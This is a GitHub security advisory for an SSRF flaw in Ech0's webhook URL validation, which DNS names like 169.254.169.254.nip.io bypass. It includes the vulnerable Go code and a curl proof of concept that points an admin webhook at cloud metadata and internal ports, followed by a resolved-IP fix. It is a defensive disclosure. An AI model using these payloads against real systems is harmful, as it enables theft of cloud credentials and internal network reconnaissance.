# [M] Ech0 has SSRF via DNS Resolution Bypass in Webhook URL Validation

## Summary
Severity: Medium
Advisory: GHSA-r2x7-427f-rq69
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-r2x7-427f-rq69
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.4.3

## Details
## Summary

The `validateWebhookURL` function in `webhook_setting_service.go` attempts to block webhooks targeting private/internal IP addresses, but only checks literal IP strings via `net.ParseIP()`. Hostnames that DNS-resolve to private IPs (e.g., `169.254.169.254.nip.io`, `10.0.0.1.nip.io`) bypass all checks, allowing an admin to create webhooks that make server-side requests to internal network services and cloud metadata endpoints.

## Details

The vulnerability is in `validateWebhookURL` (`internal/service/setting/webhook_setting_service.go:180-199`):

```go
func validateWebhookURL(rawURL string) error {
    parsed, err := url.Parse(rawURL)
    // ...
    host := strings.ToLower(parsed.Hostname())
    if host == "" || host == "localhost" || strings.HasSuffix(host, ".local") {
        return errors.New(commonModel.INVALID_WEBHOOK_URL)
    }
    if ip := net.ParseIP(host); ip != nil {  // <-- returns nil for hostnames
        if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalMulticast() ||
            ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
            return errors.New(commonModel.INVALID_WEBHOOK_URL)
        }
    }
    return nil  // hostname passes all checks unchecked
}
```

`net.ParseIP("169.254.169.254.nip.io")` returns `nil` because it is not a literal IP address. The entire private IP check block is skipped, and the function returns `nil` (valid).

Both HTTP clients that execute webhook requests use standard `http.Client` / `http.Transport` with no custom `DialContext` to verify resolved IPs:

- **TestWebhook** (`webhook_setting_service.go:169`): `&http.Client{Timeout: 5 * time.Second}`
- **Dispatcher** (`dispatcher.go:51-58`): `&http.Client{...Transport: &http.Transport{...}}` — no custom dialer

The `Dispatcher.HandleObservation` (`dispatcher.go:67-81`) iterates all active webhooks and dispatches without re-validating URLs, so a stored malicious webhook triggers SSRF on every application event.

**Execution flow:**
1. Admin calls POST `/api/webhook` with URL `http://169.254.169.254.nip.io/latest/meta-data/`
2. `CreateWebhook` → `validateWebhookURL` → `net.ParseIP` returns nil → passes validation
3. Webhook stored in database with `is_active: true`
4. On any echo event → `Dispatcher.HandleObservation` → `Dispatch` → `SendWithRetry` → DNS resolves `169.254.169.254.nip.io` to `169.254.169.254` → POST to cloud metadata endpoint

## PoC

```bash
# Step 1: Create a webhook targeting cloud metadata via DNS rebinding
curl -X POST http://localhost:8080/api/webhook \
  -H 'Authorization: Bearer <admin-jwt>' \
  -H 'Content-Type: application/json' \
  -d '{"name":"ssrf-probe","url":"http://169.254.169.254.nip.io/latest/meta-data/","secret":"","is_active":true}'

# Step 2: Trigger SSRF via test endpoint
curl -X POST http://localhost:8080/api/webhook/<webhook-id>/test \
  -H 'Authorization: Bearer <admin-jwt>'

# The server makes an HTTP POST to 169.254.169.254 (AWS metadata).
# net.ParseIP("169.254.169.254.nip.io") returns nil, skipping all IP checks.
# Delivery status and error messages reveal connectivity information.

# For internal network scanning:
# http://10.0.0.1.nip.io:8080/
# http://127.0.0.1.nip.io:6379/

# With is_active:true, every application event automatically dispatches
# to the SSRF target via Dispatcher.HandleObservation (no re-validation).
```

## Impact

- **Cloud metadata access:** An admin can reach cloud instance metadata endpoints (AWS `169.254.169.254`, GCP, Azure) to steal IAM credentials, instance identity tokens, and configuration data.
- **Internal network probing:** Webhooks can scan internal services by observing delivery status (`success`/`failed`) and error messages, mapping internal network topology.
- **Persistent SSRF:** Active webhooks fire on every application event via the Dispatcher, creating ongoing SSRF without further admin interaction.
- **Scope escalation:** Impact escapes the application's security boundary to affect internal infrastructure, despite the application explicitly attempting to prevent this.

## Recommended Fix

Replace the hostname-only check with a custom `net.Dialer` that resolves DNS and validates the resolved IP before connecting. Apply this to both HTTP clients:

```go
import "net"

func safeDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
    host, port, err := net.SplitHostPort(addr)
    if err != nil {
        return nil, err
    }
    ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
    if err != nil {
        return nil, err
    }
    for _, ip := range ips {
        if ip.IP.IsLoopback() || ip.IP.IsPrivate() || ip.IP.IsLinkLocalUnicast() ||
            ip.IP.IsLinkLocalMulticast() || ip.IP.IsUnspecified() {
            return nil, fmt.Errorf("resolved IP %s is not allowed", ip.IP)
        }
    }
    dialer := &net.Dialer{Timeout: 5 * time.Second}
    return dialer.DialContext(ctx, network, addr)
}

// Use in both TestWebhook and Dispatcher:
client := &http.Client{
    Timeout: 5 * time.Second,
    Transport: &http.Transport{
        DialContext: safeDialContext,
    },
}
```

This ensures resolved IPs are checked against the private range blocklist regardless of hostname used.

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-r2x7-427f-rq69
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.4.3
